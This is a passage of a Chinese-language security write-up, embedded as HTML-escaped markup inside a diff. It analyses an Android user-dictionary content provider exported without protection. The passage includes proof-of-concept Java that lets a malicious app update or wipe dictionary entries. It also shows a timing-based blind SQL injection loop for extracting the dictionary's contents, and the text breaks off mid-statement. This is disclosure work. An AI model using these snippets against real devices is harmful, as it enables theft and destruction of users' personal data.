+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">switch&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">sUriMatcher&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">match&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">uri&lt;/span>&lt;span class="o">))&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="n">WORDS&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">count&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">db&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">delete&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">USERDICT_TABLE_NAME&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">where&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">whereArgs&lt;/span>&lt;span class="o">);&lt;/span> &lt;span class="c1">//db.delete
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="o">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="n">WORD_ID&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">String&lt;/span> &lt;span class="n">wordId&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">uri&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getPathSegments&lt;/span>&lt;span class="o">().&lt;/span>&lt;span class="na">get&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">1&lt;/span>&lt;span class="o">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">count&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">db&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">delete&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">USERDICT_TABLE_NAME&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">Words&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">_ID&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s">&amp;#34;=&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">wordId&lt;/span> &lt;span class="c1">//db.delete
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="o">(!&lt;/span>&lt;span class="n">TextUtils&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">isEmpty&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">where&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="s">&amp;#34; AND (&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">where&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="sc">&amp;#39;)&amp;#39;&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="n">whereArgs&lt;/span>&lt;span class="o">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>&lt;span class="o">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">default&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">IllegalArgumentException&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;Unknown URI &amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">uri&lt;/span>&lt;span class="o">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Only the enabled IMEs and spell checkers can access this provider.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="o">(!&lt;/span>&lt;span class="n">canCallerAccessUserDictionary&lt;/span>&lt;span class="o">())&lt;/span> &lt;span class="o">{&lt;/span> &lt;span class="c1">//!canCallerAccessUserDictionary()
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="n">0&lt;/span>&lt;span class="o">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">getContext&lt;/span>&lt;span class="o">().&lt;/span>&lt;span class="na">getContentResolver&lt;/span>&lt;span class="o">().&lt;/span>&lt;span class="na">notifyChange&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">uri&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">mBackupManager&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">dataChanged&lt;/span>&lt;span class="o">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">count&lt;/span>&lt;span class="o">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@Override&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">public&lt;/span> &lt;span class="kt">int&lt;/span> &lt;span class="nf">update&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">Uri&lt;/span> &lt;span class="n">uri&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">ContentValues&lt;/span> &lt;span class="n">values&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">String&lt;/span> &lt;span class="n">where&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">String&lt;/span>&lt;span class="o">[]&lt;/span> &lt;span class="n">whereArgs&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">SQLiteDatabase&lt;/span> &lt;span class="n">db&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">mOpenHelper&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getWritableDatabase&lt;/span>&lt;span class="o">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">int&lt;/span> &lt;span class="n">count&lt;/span>&lt;span class="o">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">switch&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="n">sUriMatcher&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">match&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">uri&lt;/span>&lt;span class="o">))&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="n">WORDS&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">count&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">db&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">update&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">USERDICT_TABLE_NAME&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">values&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">where&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">whereArgs&lt;/span>&lt;span class="o">);&lt;/span> &lt;span class="c1">//db.update
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">break&lt;/span>&lt;span class="o">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">case&lt;/span> &lt;span class="n">WORD_ID&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">String&lt;/span> &lt;span class="n">wordId&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">uri&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">getPathSegments&lt;/span>&lt;span class="o">().&lt;/span>&lt;span class="na">get&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">1&lt;/span>&lt;span class="o">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">count&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">db&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">update&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">USERDICT_TABLE_NAME&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">values&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">Words&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">_ID&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s">&amp;#34;=&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">wordId&lt;/span> &lt;span class="c1">//db.update
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="o">+&lt;/span> &lt;span class="o">(!&lt;/span>&lt;span class="n">TextUtils&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">isEmpty&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">where&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">?&lt;/span> &lt;span class="s">&amp;#34; AND (&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">where&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="sc">&amp;#39;)&amp;#39;&lt;/span> &lt;span class="o">:&lt;/span> &lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="o">),&lt;/span> &lt;span class="n">whereArgs&lt;/span>&lt;span class="o">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>&lt;span class="o">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nl">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nl"> default:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">IllegalArgumentException&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="s">&amp;#34;Unknown URI &amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">uri&lt;/span>&lt;span class="o">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1">// Only the enabled IMEs and spell checkers can access this provider.
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="o">(!&lt;/span>&lt;span class="n">canCallerAccessUserDictionary&lt;/span>&lt;span class="o">())&lt;/span> &lt;span class="o">{&lt;/span> &lt;span class="c1">//!canCallerAccessUserDictionary()
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="n">0&lt;/span>&lt;span class="o">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">getContext&lt;/span>&lt;span class="o">().&lt;/span>&lt;span class="na">getContentResolver&lt;/span>&lt;span class="o">().&lt;/span>&lt;span class="na">notifyChange&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">uri&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">mBackupManager&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">dataChanged&lt;/span>&lt;span class="o">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">count&lt;/span>&lt;span class="o">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>最后注意&lt;code>AndroidManifest.xml&lt;/code>文件对于显式导出的内容提供者不提供任何额外的保护（例如，intent过滤器或权限）：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-xml" data-lang="xml">&lt;span class="line">&lt;span class="cl">&lt;span class="nt">&amp;lt;manifest&lt;/span> &lt;span class="na">xmlns:android=&lt;/span>&lt;span class="s">&amp;#34;http://schemas.android.com/apk/res/android&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="na">package=&lt;/span>&lt;span class="s">&amp;#34;com.android.providers.userdictionary&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="na">android:sharedUserId=&lt;/span>&lt;span class="s">&amp;#34;android.uid.shared&amp;#34;&lt;/span>&lt;span class="nt">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;application&lt;/span> &lt;span class="na">android:process=&lt;/span>&lt;span class="s">&amp;#34;android.process.acore&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="na">android:label=&lt;/span>&lt;span class="s">&amp;#34;@string/app_label&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="na">android:allowClearUserData=&lt;/span>&lt;span class="s">&amp;#34;false&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="na">android:backupAgent=&lt;/span>&lt;span class="s">&amp;#34;DictionaryBackupAgent&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="na">android:killAfterRestore=&lt;/span>&lt;span class="s">&amp;#34;false&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="na">android:usesCleartextTraffic=&lt;/span>&lt;span class="s">&amp;#34;false&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;provider&lt;/span> &lt;span class="na">android:name=&lt;/span>&lt;span class="s">&amp;#34;UserDictionaryProvider&amp;#34;&lt;/span> &lt;span class="err">//&amp;#34;UserDictionaryProvider&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="na">android:authorities=&lt;/span>&lt;span class="s">&amp;#34;user_dictionary&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="na">android:syncable=&lt;/span>&lt;span class="s">&amp;#34;false&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="na">android:multiprocess=&lt;/span>&lt;span class="s">&amp;#34;false&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="na">android:exported=&lt;/span>&lt;span class="s">&amp;#34;true&amp;#34;&lt;/span> &lt;span class="nt">/&amp;gt;&lt;/span> //android:exported=&amp;#34;true&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nt">&amp;lt;/application&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nt">&amp;lt;/manifest&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>攻击者只需从任何恶意应用程序调用如下代码，就可以更新用户字典的内容，而无需请求任何许可：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="n">ContentValues&lt;/span> &lt;span class="n">values&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">ContentValues&lt;/span>&lt;span class="o">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">values&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">put&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">UserDictionary&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">Words&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">WORD&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="s">&amp;#34;IOActive&amp;#34;&lt;/span>&lt;span class="o">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">getContentResolver&lt;/span>&lt;span class="o">().&lt;/span>&lt;span class="na">update&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">UserDictionary&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">Words&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">CONTENT_URI&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">values&lt;/span>&lt;span class="o">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kc">null&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">);&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>删除任何内容，包括整个个人字典也很简单：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="n">getContentResolver&lt;/span>&lt;span class="o">().&lt;/span>&lt;span class="na">delete&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">UserDictionary&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">Words&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">CONTENT_URI&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">);&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这两种方法(&lt;code>update&lt;/code> 和&lt;code>delete&lt;/code>) 都应该返回受影响的行数，但是在这种情况下(对于非法的调用) 总是返回零，这使得攻击者更难从内容提供者提取或推断出任何信息。&lt;/p>
+&lt;p>在这一点上，从攻击者者的角度来看，这可能是我们所能做的全部。虽然删除或更新任意条目可能会给最终用户带来麻烦，但最有趣的部分是访问个人数据。&lt;/p>
+&lt;p>即使查询功能没有受到这个功能的直接影响，但仍然可以通过利用基于时间的侧通道攻击来转储整个内容。 由于攻击者完全可控&lt;code>where&lt;/code>参数，并且由于任何行的成功更新比不影响任何行的同一语句需要更多时间来执行，所以下面描述的攻击被证明是有效的。&lt;/p>
+&lt;h3 id="简单的poc">简单的PoC&lt;/h3>
+&lt;p>考虑从恶意应用程序运行以下代码片段:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-java" data-lang="java">&lt;span class="line">&lt;span class="cl">&lt;span class="n">ContentValues&lt;/span> &lt;span class="n">values&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="n">ContentValues&lt;/span>&lt;span class="o">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">values&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">put&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">UserDictionary&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">Words&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">_ID&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">1&lt;/span>&lt;span class="o">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">long&lt;/span> &lt;span class="n">t0&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">nanoTime&lt;/span>&lt;span class="o">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">0&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">200&lt;/span>&lt;span class="o">;&lt;/span> &lt;span class="n">i&lt;/span>&lt;span class="o">++)&lt;/span> &lt;span class="o">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">getContentResolver&lt;/span>&lt;span class="o">().&lt;/span>&lt;span class="na">update&lt;/span>&lt;span class="o">(&lt;/span>&lt;span class="n">UserDictionary&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">Words&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">CONTENT_URI&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="n">values&lt;/span>&lt;span class="o">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;_id = 1 AND word LIKE &amp;#39;a%&amp;#39;&amp;#34;&lt;/span>&lt;span class="o">,&lt;/span> &lt;span class="kc">null&lt;/span>&lt;span class="o">);&lt;/span> &lt;span class="c1">//AND word LIKE &amp;#39;a%&amp;#39;&amp;#34;
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">long&lt;/span> &lt;span class="n">t1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">System&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="na">nanoTime&lt;/span>&lt;span class="o">();&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>多次调用相同的语句（比如200次，取决于设备），计算为“true”的SQL条件与计算为“false”的条件之间的时间差(t1-t0)结果将是显而易见的,这将允许攻击者通过利用一个典型的基于时间的布尔盲注Sql注入攻击来提取出受影响数据库中的所有信息。&lt;/p>
+&lt;p>因此，如果字典中的第一个用户自定义的单词以字母“a”开头，这个条件将被评估为“true”，上面的代码片段将需要更多的时间来执行（比如5秒），而当猜测为假时所需的时间较短(比如2秒)。因为在这种情况下，没有任何一行会被更新。如果猜错了，我们可以用“b”，“c”，等等。 如果猜测是正确的，就意味着我们知道单词的第一个字符，所以我们可以使用相同的方法来猜测第二个字符。然后我们可以移到下一个单词，以此类推，直到我们转储整个字典或任何可过滤的行和字段子集。&lt;/p>
+&lt;p>为了避免更改数据库的内容，请注意我们如何更新检索到的单词的“id”列，以匹配它的原始值，因此内部幂等语句将如下所示：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-sql" data-lang="sql">&lt;span class="line">&lt;span class="cl">&lt;span class="k">UPDATE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">words&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">SET&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">_id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">N&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">WHERE&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">_id&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">N&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">AND&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">condition&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w">
